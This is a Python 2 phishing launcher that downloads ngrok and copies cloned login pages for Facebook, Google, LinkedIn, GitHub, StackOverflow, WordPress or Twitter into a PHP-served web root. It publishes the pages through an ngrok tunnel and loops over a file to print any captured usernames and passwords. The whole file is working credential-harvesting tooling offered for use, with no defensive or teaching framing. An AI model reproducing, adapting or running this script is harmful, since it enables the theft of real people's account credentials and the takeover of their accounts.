#-*- coding: utf-8 -*-
###########################
from time import sleep
from sys import stdout, exit
from os import system, path
import multiprocessing
from urllib import urlopen
from platform import system as systemos, architecture
from wget import download

RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'

def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False
if connected() == False:
     print '''{0}[{1}!{0}]{1} Network error. Verify your connection.\n'''.format(RED, END)
     exit(0)

def checkNgrok():
    if path.isfile('Server/ngrok') == False: 
        print '[*] Downloading Ngrok...'
        ostype = systemos().lower()
        if architecture()[0] == '64bit':
            filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
        else:
            filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok Server/ngrok')
        system('rm -Rf ' + filename)
        system('clear')
checkNgrok()

def end():
    print '\n{0}[{1}+{0}]{1} CTRL+C detected, exiting.'.format(CYAN, END)

def loadModule(module):
       print '{0}[{1}*{0}]{1} %s module loaded. Building site...{0}'.format(CYAN, END) % module

def runPhishing(social, option2):
    system('sudo rm -Rf Server/www/*.* && touch Server/www/cat.txt')
    if option2 == '1' and social == 'Facebook':
        system('cp WebPages/fb_standard/*.* Server/www/')
    if option2 == '2' and social == 'Facebook':
        system('cp WebPages/fb_advanced_poll/*.* Server/www/')
    elif option2 == '1' and social == 'Google':
        system('cp WebPages/google_standard/*.* Server/www/')
    elif option2 == '2' and social == 'Google':
        system('cp WebPages/google_advanced_poll/*.* Server/www/')   
    elif social == 'LinkedIn':
        system('cp WebPages/linkedin/*.* Server/www/')
    elif social == 'Github':
        system('cp WebPages/github/*.* Server/www/')
    elif social == 'StackOverflow':
        system('cp WebPages/stackoverflow/*.* Server/www/')
    elif social == 'WordPress':
        system('cp WebPages/wordpress/*.* Server/www/')
    elif social == 'Twitter':
        system('cp WebPages/twitter/*.* Server/www/')

def waitCreds():
    print "{0}[{1}*{0}]{1} Waiting for credentials... \n".format(GREEN, END)
    while True:
        with open('Server/www/cat.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0: 
            print '{0}[{1}+{0}]{1} CREDENTIALS FOUND {1}:\n {0}%s{1}'.format(GREEN, END) % lines
            system('rm -rf Server/www/cat.txt && touch Server/www/cat.txt')
        creds.close()

def runPEnv():
    if 256 == system('which php > /dev/null'):
        print "{0}[{1}x{0}]{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again. http://www.php.net/".format(RED, END)
        exit(0)
    option = raw_input() ##
    if option == '1':
        loadModule('Facebook')
        option2 = raw_input()
        runPhishing('Facebook', option2)
    elif option == '2':
        loadModule('Google')
        option2 = raw_input()
        runPhishing('Google', option2)
    elif option == '3':
        loadModule('LinkedIn')
        option2 = ''
        runPhishing('LinkedIn', option2)
    elif option == '4':
        loadModule('Github')
        option2 = ''
        runPhishing('Github', option2)
    elif option == '5':
        loadModule('StackOverflow')
        option2 = ''
        runPhishing('StackOverflow', option2)
    elif option == '6':
        loadModule('WordPress')
        option2 = ''
        runPhishing('WordPress', option2)
    elif option == '7':
        loadModule('Twitter')
        option2 = ''
        runPhishing('Twitter', option2)
    else:
        exit(0)

def runNgrok():
    system('./Server/ngrok http 80 > /dev/null &')
    sleep(10)
    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
    url = open('ngrok.url', 'r')
    print('{0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
    url.close()

def runServer():
    system("cd Server/www/ && sudo php -S 127.0.0.1:80 2> /dev/null 1> /dev/null")

if __name__ == "__main__":
    try:
        runPEnv()
        runNgrok()
        multiprocessing.Process(target=runServer).start()
        waitCreds()
    except KeyboardInterrupt:
        system('pkill -f ngrok')
        end()
        exit(0)
